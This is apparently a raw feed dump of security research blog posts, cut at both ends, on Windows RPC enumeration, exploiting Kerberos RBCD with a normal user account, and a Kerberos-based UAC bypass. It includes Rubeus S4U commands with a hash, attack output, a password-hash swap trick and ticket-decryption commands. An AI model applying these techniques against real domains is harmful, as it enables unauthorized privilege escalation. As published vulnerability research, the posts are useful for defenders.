/></div><div>We are still missing some crucial information that <i>RpcView </i>can access such as the interface registration flags from any approach. Still, hopefully that gives you a few ways to approach analyzing the RPC attack surface of the local system and determining what endpoints you can call.</div></div></div>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3144647968364694402"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3144647968364694402"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2022/06/finding-running-rpc-server-information.html", "title": "Finding Running RPC Server Information with NtObjectManager"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-6891247723160413797", "guidislink": true, "link": "https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html", "published": "2022-05-13T19:29:00.004-07:00", "published_parsed": [2022, 5, 14, 2, 29, 0, 5, 134, 0], "updated": "2022-05-13T19:30:53.260-07:00", "updated_parsed": [2022, 5, 14, 2, 30, 53, 5, 134, 0], "tags": [{"term": "Authentication", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Exploit", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Kerberos", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Exploiting RBCD Using a Normal User Account*", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Exploiting RBCD Using a Normal User Account*"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p><i>* Caveats apply.</i></p><p>Resource Based Constrained Delegate (RBCD) privilege escalation, described by <a href=\"https://twitter.com/elad_shamir\">Elad Shamir</a> in the <a href=\"https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\">\"Wagging the Dog\"</a>&nbsp;blog post is a devious way of exploiting Kerberos to elevate privileged on a local&nbsp; Windows machine. All it requires is write access to local computer's domain account to modify the&nbsp;<i>msDS-AllowedToActOnBehalfOfOtherIdentity</i>&nbsp;LDAP attribute to add another account's SID. You can then use that account with the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94\">Services For User</a>&nbsp;(S4U) protocols to get a Kerberos service ticket for the local machine as any user on the domain including local administrators. From there you can <a href=\"https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82\">create a new service</a> or whatever else you need to do.</p><p>The key is how you write to the LDAP server under the local computer's domain account. There's been various approaches usually abusing authentication relay. For example, I described one relay vector which abused <a href=\"https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html\">DCOM</a>. Someone else has then put this together in a turnkey tool, <a href=\"https://github.com/Dec0ne/KrbRelayUp\">KrbRelayUp</a>.&nbsp;</p><p>One additional criteria for this to work is having access to another computer account to perform the attack. Well this isn't strictly true, there's the <a href=\"https://github.com/eladshamir/Whisker\">Shadow Credentials attack</a> which allows you to reuse the same local computer account, but in general you need a computer account you control. Normally this isn't a problem, as the DC allows normal users to create new computer accounts up to a limit set by the domain's&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota\">ms-DS-MachineAccountQuota</a> attribute value. This attribute defaults to 10, but an administrator could set it to 0 and block the attack, which is probably recommend.</p><p>But I wondered why this wouldn't work as a normal user. The&nbsp;<i>msDS-AllowedToActOnBehalfOfOtherIdentity</i> attribute just needs the SID for the account to be allowed to delegate to the computer. Why can't we just add the user's SID and perform the S4U dance? To give us the best chance I'll assume we have knowledge of a user's password, how you get this is entirely up to you. Running the attack through <a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a> shows our problem.</p><p><span style=\"font-family: courier;\">PS C:\\&gt; Rubeus.exe&nbsp;s4u /user:charlie /domain:domain.local /dc:primarydc.domain.local /rc4:79bf93c9501b151506adc21ba0397b33 /impersonateuser:Administrator /msdsspn:cifs/WIN10TEST.domain.local</span></p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">&nbsp; &nbsp;______&nbsp; &nbsp; &nbsp; &nbsp; _<br />&nbsp; (_____ \\&nbsp; &nbsp; &nbsp; | |<br />&nbsp; &nbsp;_____) )_&nbsp; &nbsp;_| |__&nbsp; _____ _&nbsp; &nbsp;_&nbsp; ___<br />&nbsp; |&nbsp; __&nbsp; /| | | |&nbsp; _ \\| ___ | | | |/___)<br /></span><span style=\"font-family: courier;\">&nbsp; | |&nbsp; \\ \\| |_| | |_) ) ____| |_| |___ |<br /></span><span style=\"font-family: courier;\">&nbsp; |_|&nbsp; &nbsp;|_|____/|____/|_____)____/(___/<br /></span><span style=\"font-family: courier;\">&nbsp; v2.0.3<br /></span><span style=\"font-family: courier;\">[*] Action: S4U<br /></span><span style=\"font-family: courier;\">[*] Using rc4_hmac hash: 79bf93c9501b151506adc21ba0397b33<br /></span><span style=\"font-family: courier;\">[*] Building AS-REQ (w/ preauth) for: 'domain.local\\charlie'<br /></span><span style=\"font-family: courier;\">[*] Using domain controller: 10.0.0.10:88<br /></span><span style=\"font-family: courier;\">[+] TGT request successful!<br /></span><span style=\"font-family: courier;\">[*] base64(ticket.kirbi):<br /></span><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; doIFc...<br /></span><span style=\"font-family: courier;\">[*] Action: S4U<br /></span><span style=\"font-family: courier;\">[*] Building S4U2self request for: 'charlie@DOMAIN.LOCAL'<br /></span><span style=\"font-family: courier;\">[*] Using domain controller: primarydc.domain.local (10.0.0.10)<br /></span><span style=\"font-family: courier;\">[*] Sending S4U2self request to 10.0.0.10:88<br /></span><span style=\"font-family: courier;\">[X] KRB-ERROR (7) : KDC_ERR_S_PRINCIPAL_UNKNOWN<br /></span><span style=\"font-family: courier;\">[X] S4U2Self failed, unable to perform S4U2Proxy.</span></div><p>We don't even get past the first S4U2Self stage of the attack, it fails with a <i>KDC_ERR_S_PRINCIPAL_UNKNOWN</i> error. This error typically indicates the KDC doesn't know what encryption key to use for the generated ticket. If you add an SPN to the user's account however it all succeeds. This would imply it's not a problem with a user account per-se, but instead just a problem of the KDC not being able to select the correct key.</p><p>Technically speaking there should be no reason that the KDC couldn't use the user's long term key if you requested a ticket for their UPN, but it doesn't (contrary to an argument I had on <a href=\"https://old.reddit.com/r/netsec/\">/r/netsec</a> the other day with someone who was adamant that SPN's are a convenience, not a fundamental requirement of Kerberos).&nbsp;</p><p>So what to do? There is a way of getting a ticket encrypted for a UPN by using the&nbsp;<a href=\"https://datatracker.ietf.org/doc/html/draft-swift-win2k-krb-user2user-01\">User 2 User (U2U)</a>&nbsp;extension. Would this work here? Looking at the Rubeus code it seems requesting a U2U S4U2Self ticket is supported, but the parameters are not set for the S4U attack. Let's set those parameters to request a U2U ticket and see if it works.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">[+] S4U2self success!<br />[*] Got a TGS for 'Administrator' to 'charlie@DOMAIN.LOCAL'<br />[*] base64(ticket.kirbi): doIF...bGll</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\"><br />[*] Impersonating user 'Administrator' to target SPN 'cifs/WIN10TEST.domain.local'<br />[*] Building S4U2proxy request for service: 'cifs/WIN10TEST.domain.local'<br />[*] Using domain controller: primarydc.domain.local (10.0.0.10)<br />[*] Sending S4U2proxy request to domain controller 10.0.0.10:88<br />[X] KRB-ERROR (13) : KDC_ERR_BADOPTION</span></div><p style=\"text-align: left;\">Okay, we're getting closer. The S4U2Self request was successful, unfortunately the S4U2Proxy request was not, failing with a <i>KDC_ERR_BADOPTION</i> error. After a bit of playing around this is almost certainly because the KDC can't decrypt the ticket sent in the S4U2Proxy request. It'll try the user's long term key, but that will obviously fail. I tried to see if I could send the user's TGT with the request (in addition to the S4U2Self service ticket) but it still failed. Is this not going to be possible?</p><p style=\"text-align: left;\">Thinking about this a bit more, I wondered, could I decrypt the S4U2Self ticket and then encrypt with the long term key I already know for the user? Technically speaking this would create a valid Kerberos ticket, however it wouldn't create a valid PAC. This is because the PAC contains a <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/a194aa34-81bd-46a0-a931-2e05b87d1098\">Server Signature</a>&nbsp;which is a HMAC of the PAC using the key used to encrypt the ticket. The KDC checks this to ensure the PAC hasn't been modified or put into a new ticket, and if it's incorrect it'll fail the request.</p><p style=\"text-align: left;\">As we know the key, we could just update this value. However, the <i>Server Signature</i> is protected by the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3122bf00-ea87-4c3f-92a0-91c0a99f5eec\">KDC Signature</a>&nbsp;which is a HMAC keyed with the KDC's own key. We don't know this key and so we can't update this second signature to match the modified <i>Server Signature</i>. Looks like we're stuck.</p><p style=\"text-align: left;\">Still, what would happen if the user's long term key happened to match the TGT session key we used to encrypt the S4U2Self ticket? It's pretty unlikely to happen by chance, but with knowledge of the user's password we could conceivably change the user's password on the DC between the S4U2Self and the S4U2Proxy requests so that when submitting the ticket the KDC can decrypt it and perhaps we can successfully get the delegated ticket.</p><p style=\"text-align: left;\">As we know the TGT's session key, one obvious approach would be to \"crack\" the hash value back to a valid Unicode password. For AES keys I think this is going to be difficult and even if successful could be time consuming. However, RC4 keys are just a MD4 hash with no additional protection against brute force cracking. Fortunately the code in Rubeus defaults to requesting an RC4 session key for the TGT, and MS have yet to disable RC4 by default in Windows domains. This seems like it might be doable, even if it takes a long time. We would also need the \"cracked\" password to be valid per the domain's password policy which adds extra complications.</p><p style=\"text-align: left;\">However, I recalled when playing with the SAM RPC APIs that there is a&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476\">SamrChangePasswordUser</a> method which will change a user's password to an arbitrary NT hash. The only requirement is knowledge of the existing NT hash and we can set any new NT hash we like. This doesn't need to honor the password policy, except for the minimum age setting. We don't even need to deal with how to call the RPC API correctly as the SAM DLL exports the <a href=\"https://twitter.com/gentilkiwi/status/1117584708173488128\">SamiChangePasswordUser</a> API which does all the hard work.&nbsp;</p><p style=\"text-align: left;\">I took some <a href=\"https://github.com/vletoux/NTLMInjector/blob/master/SetNTLM.ps1\">example C# code</a> written by&nbsp;<a href=\"https://twitter.com/mysmartlogon\">Vincent Le Toux</a>&nbsp;and plugged that into Rubeus at the correct point, passing the current TGT's session key as the new NT hash. Let's see if it works:</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">SamConnect OK<br />SamrOpenDomain OK<br />rid is 1208<br />SamOpenUser OK<br />SamiChangePasswordUser OK<br /><br />[*] Impersonating user 'Administrator' to target SPN 'cifs/WIN10TEST.domain.local'<br />[*] Building S4U2proxy request for service: 'cifs/WIN10TEST.domain.local'<br />[*] Using domain controller: primarydc.domain.local (10.0.0.10)<br />[*] Sending S4U2proxy request to domain controller 10.0.0.10:88<br />[+] S4U2proxy success!<br />[*] base64(ticket.kirbi) for SPN 'cifs/WIN10TEST.domain.local':<br />&nbsp; &nbsp; &nbsp; doIG3...</span></div><p style=\"text-align: left;\">And it does! Now the caveats:</p><p style=\"text-align: left;\"></p><ul style=\"text-align: left;\"><li>This will obviously only work if RC4 is still enabled on the domain.&nbsp;</li><li>You will need the user's password or NT hash. I couldn't think of a way of doing this with only a valid TGT.</li><li>The user is sacrificial, it might be hard to login using a password afterwards.&nbsp;If you can't immediately reset the password due to the domain's policy the user might be completely broken.&nbsp;</li><li>It's not very silent, but that's not my problem.</li><li>You're probably better to just do the shadow credentials attack, if PKINIT is enabled.</li></ul>As I'm feeling lazy I'm not going to provide the changes to Rubeus. Except for the call to&nbsp;<i>SamiChangePasswordUser</i> all the code is already there to perform the attack, it just needs to be wired up. I'm sure they'd welcome the addition."}], "summary": "<p><i>* Caveats apply.</i></p><p>Resource Based Constrained Delegate (RBCD) privilege escalation, described by <a href=\"https://twitter.com/elad_shamir\">Elad Shamir</a> in the <a href=\"https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\">\"Wagging the Dog\"</a>&nbsp;blog post is a devious way of exploiting Kerberos to elevate privileged on a local&nbsp; Windows machine. All it requires is write access to local computer's domain account to modify the&nbsp;<i>msDS-AllowedToActOnBehalfOfOtherIdentity</i>&nbsp;LDAP attribute to add another account's SID. You can then use that account with the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94\">Services For User</a>&nbsp;(S4U) protocols to get a Kerberos service ticket for the local machine as any user on the domain including local administrators. From there you can <a href=\"https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82\">create a new service</a> or whatever else you need to do.</p><p>The key is how you write to the LDAP server under the local computer's domain account. There's been various approaches usually abusing authentication relay. For example, I described one relay vector which abused <a href=\"https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html\">DCOM</a>. Someone else has then put this together in a turnkey tool, <a href=\"https://github.com/Dec0ne/KrbRelayUp\">KrbRelayUp</a>.&nbsp;</p><p>One additional criteria for this to work is having access to another computer account to perform the attack. Well this isn't strictly true, there's the <a href=\"https://github.com/eladshamir/Whisker\">Shadow Credentials attack</a> which allows you to reuse the same local computer account, but in general you need a computer account you control. Normally this isn't a problem, as the DC allows normal users to create new computer accounts up to a limit set by the domain's&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota\">ms-DS-MachineAccountQuota</a> attribute value. This attribute defaults to 10, but an administrator could set it to 0 and block the attack, which is probably recommend.</p><p>But I wondered why this wouldn't work as a normal user. The&nbsp;<i>msDS-AllowedToActOnBehalfOfOtherIdentity</i> attribute just needs the SID for the account to be allowed to delegate to the computer. Why can't we just add the user's SID and perform the S4U dance? To give us the best chance I'll assume we have knowledge of a user's password, how you get this is entirely up to you. Running the attack through <a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a> shows our problem.</p><p><span style=\"font-family: courier;\">PS C:\\&gt; Rubeus.exe&nbsp;s4u /user:charlie /domain:domain.local /dc:primarydc.domain.local /rc4:79bf93c9501b151506adc21ba0397b33 /impersonateuser:Administrator /msdsspn:cifs/WIN10TEST.domain.local</span></p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">&nbsp; &nbsp;______&nbsp; &nbsp; &nbsp; &nbsp; _<br />&nbsp; (_____ \\&nbsp; &nbsp; &nbsp; | |<br />&nbsp; &nbsp;_____) )_&nbsp; &nbsp;_| |__&nbsp; _____ _&nbsp; &nbsp;_&nbsp; ___<br />&nbsp; |&nbsp; __&nbsp; /| | | |&nbsp; _ \\| ___ | | | |/___)<br /></span><span style=\"font-family: courier;\">&nbsp; | |&nbsp; \\ \\| |_| | |_) ) ____| |_| |___ |<br /></span><span style=\"font-family: courier;\">&nbsp; |_|&nbsp; &nbsp;|_|____/|____/|_____)____/(___/<br /></span><span style=\"font-family: courier;\">&nbsp; v2.0.3<br /></span><span style=\"font-family: courier;\">[*] Action: S4U<br /></span><span style=\"font-family: courier;\">[*] Using rc4_hmac hash: 79bf93c9501b151506adc21ba0397b33<br /></span><span style=\"font-family: courier;\">[*] Building AS-REQ (w/ preauth) for: 'domain.local\\charlie'<br /></span><span style=\"font-family: courier;\">[*] Using domain controller: 10.0.0.10:88<br /></span><span style=\"font-family: courier;\">[+] TGT request successful!<br /></span><span style=\"font-family: courier;\">[*] base64(ticket.kirbi):<br /></span><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; doIFc...<br /></span><span style=\"font-family: courier;\">[*] Action: S4U<br /></span><span style=\"font-family: courier;\">[*] Building S4U2self request for: 'charlie@DOMAIN.LOCAL'<br /></span><span style=\"font-family: courier;\">[*] Using domain controller: primarydc.domain.local (10.0.0.10)<br /></span><span style=\"font-family: courier;\">[*] Sending S4U2self request to 10.0.0.10:88<br /></span><span style=\"font-family: courier;\">[X] KRB-ERROR (7) : KDC_ERR_S_PRINCIPAL_UNKNOWN<br /></span><span style=\"font-family: courier;\">[X] S4U2Self failed, unable to perform S4U2Proxy.</span></div><p>We don't even get past the first S4U2Self stage of the attack, it fails with a <i>KDC_ERR_S_PRINCIPAL_UNKNOWN</i> error. This error typically indicates the KDC doesn't know what encryption key to use for the generated ticket. If you add an SPN to the user's account however it all succeeds. This would imply it's not a problem with a user account per-se, but instead just a problem of the KDC not being able to select the correct key.</p><p>Technically speaking there should be no reason that the KDC couldn't use the user's long term key if you requested a ticket for their UPN, but it doesn't (contrary to an argument I had on <a href=\"https://old.reddit.com/r/netsec/\">/r/netsec</a> the other day with someone who was adamant that SPN's are a convenience, not a fundamental requirement of Kerberos).&nbsp;</p><p>So what to do? There is a way of getting a ticket encrypted for a UPN by using the&nbsp;<a href=\"https://datatracker.ietf.org/doc/html/draft-swift-win2k-krb-user2user-01\">User 2 User (U2U)</a>&nbsp;extension. Would this work here? Looking at the Rubeus code it seems requesting a U2U S4U2Self ticket is supported, but the parameters are not set for the S4U attack. Let's set those parameters to request a U2U ticket and see if it works.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">[+] S4U2self success!<br />[*] Got a TGS for 'Administrator' to 'charlie@DOMAIN.LOCAL'<br />[*] base64(ticket.kirbi): doIF...bGll</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\"><br />[*] Impersonating user 'Administrator' to target SPN 'cifs/WIN10TEST.domain.local'<br />[*] Building S4U2proxy request for service: 'cifs/WIN10TEST.domain.local'<br />[*] Using domain controller: primarydc.domain.local (10.0.0.10)<br />[*] Sending S4U2proxy request to domain controller 10.0.0.10:88<br />[X] KRB-ERROR (13) : KDC_ERR_BADOPTION</span></div><p style=\"text-align: left;\">Okay, we're getting closer. The S4U2Self request was successful, unfortunately the S4U2Proxy request was not, failing with a <i>KDC_ERR_BADOPTION</i> error. After a bit of playing around this is almost certainly because the KDC can't decrypt the ticket sent in the S4U2Proxy request. It'll try the user's long term key, but that will obviously fail. I tried to see if I could send the user's TGT with the request (in addition to the S4U2Self service ticket) but it still failed. Is this not going to be possible?</p><p style=\"text-align: left;\">Thinking about this a bit more, I wondered, could I decrypt the S4U2Self ticket and then encrypt with the long term key I already know for the user? Technically speaking this would create a valid Kerberos ticket, however it wouldn't create a valid PAC. This is because the PAC contains a <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/a194aa34-81bd-46a0-a931-2e05b87d1098\">Server Signature</a>&nbsp;which is a HMAC of the PAC using the key used to encrypt the ticket. The KDC checks this to ensure the PAC hasn't been modified or put into a new ticket, and if it's incorrect it'll fail the request.</p><p style=\"text-align: left;\">As we know the key, we could just update this value. However, the <i>Server Signature</i> is protected by the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3122bf00-ea87-4c3f-92a0-91c0a99f5eec\">KDC Signature</a>&nbsp;which is a HMAC keyed with the KDC's own key. We don't know this key and so we can't update this second signature to match the modified <i>Server Signature</i>. Looks like we're stuck.</p><p style=\"text-align: left;\">Still, what would happen if the user's long term key happened to match the TGT session key we used to encrypt the S4U2Self ticket? It's pretty unlikely to happen by chance, but with knowledge of the user's password we could conceivably change the user's password on the DC between the S4U2Self and the S4U2Proxy requests so that when submitting the ticket the KDC can decrypt it and perhaps we can successfully get the delegated ticket.</p><p style=\"text-align: left;\">As we know the TGT's session key, one obvious approach would be to \"crack\" the hash value back to a valid Unicode password. For AES keys I think this is going to be difficult and even if successful could be time consuming. However, RC4 keys are just a MD4 hash with no additional protection against brute force cracking. Fortunately the code in Rubeus defaults to requesting an RC4 session key for the TGT, and MS have yet to disable RC4 by default in Windows domains. This seems like it might be doable, even if it takes a long time. We would also need the \"cracked\" password to be valid per the domain's password policy which adds extra complications.</p><p style=\"text-align: left;\">However, I recalled when playing with the SAM RPC APIs that there is a&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476\">SamrChangePasswordUser</a> method which will change a user's password to an arbitrary NT hash. The only requirement is knowledge of the existing NT hash and we can set any new NT hash we like. This doesn't need to honor the password policy, except for the minimum age setting. We don't even need to deal with how to call the RPC API correctly as the SAM DLL exports the <a href=\"https://twitter.com/gentilkiwi/status/1117584708173488128\">SamiChangePasswordUser</a> API which does all the hard work.&nbsp;</p><p style=\"text-align: left;\">I took some <a href=\"https://github.com/vletoux/NTLMInjector/blob/master/SetNTLM.ps1\">example C# code</a> written by&nbsp;<a href=\"https://twitter.com/mysmartlogon\">Vincent Le Toux</a>&nbsp;and plugged that into Rubeus at the correct point, passing the current TGT's session key as the new NT hash. Let's see if it works:</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">SamConnect OK<br />SamrOpenDomain OK<br />rid is 1208<br />SamOpenUser OK<br />SamiChangePasswordUser OK<br /><br />[*] Impersonating user 'Administrator' to target SPN 'cifs/WIN10TEST.domain.local'<br />[*] Building S4U2proxy request for service: 'cifs/WIN10TEST.domain.local'<br />[*] Using domain controller: primarydc.domain.local (10.0.0.10)<br />[*] Sending S4U2proxy request to domain controller 10.0.0.10:88<br />[+] S4U2proxy success!<br />[*] base64(ticket.kirbi) for SPN 'cifs/WIN10TEST.domain.local':<br />&nbsp; &nbsp; &nbsp; doIG3...</span></div><p style=\"text-align: left;\">And it does! Now the caveats:</p><p style=\"text-align: left;\"></p><ul style=\"text-align: left;\"><li>This will obviously only work if RC4 is still enabled on the domain.&nbsp;</li><li>You will need the user's password or NT hash. I couldn't think of a way of doing this with only a valid TGT.</li><li>The user is sacrificial, it might be hard to login using a password afterwards.&nbsp;If you can't immediately reset the password due to the domain's policy the user might be completely broken.&nbsp;</li><li>It's not very silent, but that's not my problem.</li><li>You're probably better to just do the shadow credentials attack, if PKINIT is enabled.</li></ul>As I'm feeling lazy I'm not going to provide the changes to Rubeus. Except for the call to&nbsp;<i>SamiChangePasswordUser</i> all the code is already there to perform the attack, it just needs to be wired up. I'm sure they'd welcome the addition.", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/6891247723160413797"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/6891247723160413797"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html", "title": "Exploiting RBCD Using a Normal User Account*"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-3024444652464781277", "guidislink": true, "link": "https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html", "published": "2022-03-20T02:52:00.004-07:00", "published_parsed": [2022, 3, 20, 9, 52, 0, 6, 79, 0], "updated": "2022-03-20T16:21:57.984-07:00", "updated_parsed": [2022, 3, 20, 23, 21, 57, 6, 79, 0], "title": "Bypassing UAC in the most Complex Way Possible!", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Bypassing UAC in the most Complex Way Possible!"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>While it's not something I spend much time on, finding a new way to bypass UAC is always amusing. When reading through some of the features of the <a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a> tool I realised that there was a possible way of abusing Kerberos to bypass UAC, well on domain joined systems at least. It's unclear if this has been documented before, <a href=\"https://ijustwannared.team/2020/02/13/impacket-proxychains-rubeus-and-uac/\">this post</a> seems to discuss something similar but relies on doing the UAC bypass from another system, but what I'm going to describe works locally. Even if it has been described as a technique before I'm not sure it's been documented how it works under the hood.</p><h3 style=\"text-align: left;\">The Background!</h3><div>Let's start with how the system prevents you bypassing the most pointless security feature ever. By default LSASS will filter any network authentication tokens to remove admin privileges if the users is a local administrator. However there's an important exception, if the user a domain user and a local administrator then LSASS will allow the network authentication to use the full administrator token. This is a problem if say you're using <i>Kerberos </i>to authenticate locally. Wouldn't this be a trivial UAC bypass? Just authenticate to the local service as a domain user and you'd get the network token which would bypass the filtering?</div><div><br /></div><div>Well no, <i>Kerberos </i>has specific additions to block this attack vector. If I was being charitable I'd say this behaviour also ensures some level of safety.&nbsp; If you're not running as the admin token then accessing say the SMB loopback interface shouldn't suddenly grant you administrator privileges through which you might accidentally destroy your system.</div><div><br /></div><div>Back in January last year I read a&nbsp;<a href=\"https://syfuhs.net/preventing-uac-bypass-through-kerberos-loopback\">post</a>&nbsp;from&nbsp;<a href=\"https://twitter.com/SteveSyfuhs\">Steve Syfuhs</a>&nbsp;of Microsoft on how <i>Kerberos </i>prevents this local UAC bypass. The TL;DR; is when a user wants to get a <i>Kerberos </i>ticket for a service LSASS will send a TGS-REQ request to the KDC. In the request it'll embed some security information which indicates the user is local. This information will be embedded in the generated ticket.&nbsp;</div><div><br /></div><div>When that ticket is used to authenticate to the same system <i>Kerberos </i>can extract the information and see if it matches one it knows about. If so it'll take that information and realize that the user is not elevated and filter the token appropriately. Unfortunately much as enjoy Steve's posts this one was especially light on details. I guessed I'd have to track down how it works myself. Let's dump the contents of a <i>Kerberos </i>ticket and see if we can see what could be the ticket information:</div><div><br /></div><div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> $c = New-LsaCredentialHandle -Package 'Kerberos' -UseFlag Outbound</span></div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> $x = New-LsaClientContext -CredHandle $c -Target HOST/$env:COMPUTERNAME</span></div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> $key = Get-KerberosKey -HexKey 'XXX' -KeyType AES256_CTS_HMAC_SHA1_96 -Principal $env:COMPTUERNAME</span></div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> $u = Unprotect-LsaAuthToken -Token $x.Token -Key $key</span></div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> Format-LsaAuthToken $u</span></div></div><div><span style=\"font-family: courier;\"><br /></span></div><div><div><span style=\"font-family: courier;\">&lt;KerberosV5 KRB_AP_REQ&gt;</span></div><div><span style=\"font-family: courier;\">Options&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: None</span></div><div><span style=\"font-family: courier;\">&lt;Ticket&gt;</span></div><div><span style=\"font-family: courier;\">Ticket Version&nbsp; : 5</span></div></div><div><span style=\"font-family: courier;\">...</span></div><div><br /></div><div><div><span style=\"background-color: #e06666; font-family: courier;\">&lt;Authorization Data - KERB_AD_RESTRICTION_ENTRY&gt;</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">Flags&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: LimitedToken</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">Integrity Level : Medium</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">Machine ID&nbsp; &nbsp; &nbsp; : 6640665F...</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"background-color: #ffd966; font-family: courier;\">&lt;Authorization Data - KERB_LOCAL&gt;</span></div><div><span style=\"background-color: #ffd966; font-family: courier;\">Security Context: 60CE03337E01000025FC763900000000</span></div></div><div><br /></div><div>I've highlighted the two ones of interest, the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/1aeca7fb-d6b4-4402-8fa4-6ec3e955c16e\">KERB-AD-RESTRICTION-ENTRY</a> and the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a01b297-c47f-4547-9268-cf589aedd063\">KERB-LOCAL</a> entry. Of course I didn't guess these names, these are sort of documented in the Microsoft Kerberos Protocol Extensions (<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9\">MS-KILE</a>) specification. The&nbsp;<i>KERB_AD_RESTRICTION_ENTRY</i> is most obviously of interest, it contains both the works <i>\"LimitedToken\"</i> and <i>\"Medium Integrity Level\"</i>.&nbsp;</div><div><br /></div><div>When accepting a Kerberos <i>AP-REQ</i> from a network client via SSPI the Kerberos module in LSASS will call the LSA function&nbsp;<i>LsaISetSupplementalTokenInfo</i> to apply the information from&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> to the token if needed. The pertinent code is roughly the following:</div><div><br /></div><div><div><span style=\"font-family: courier;\">NTSTATUS LsaISetSupplementalTokenInfo(PHANDLE phToken,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PLSAP_TOKEN_INFO_INTEGRITY pTokenInfo) {</span></div><div><span style=\"font-family: courier;\">&nbsp; // ...</span></div><div><span style=\"font-family: courier;\">&nbsp; BOOL bLoopback = FALSE:</span></div><div><span style=\"font-family: courier;\">&nbsp; BOOL bFilterNetworkTokens = FALSE;</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"background-color: #f9cb9c; font-family: courier;\">&nbsp; if (!memcmp(&amp;LsapGlobalMachineID, pTokenInfo-&gt;MachineID,</span></div><div><span style=\"background-color: #f9cb9c; font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp;sizeof(LsapGlobalMachineID))) {</span></div><div><span 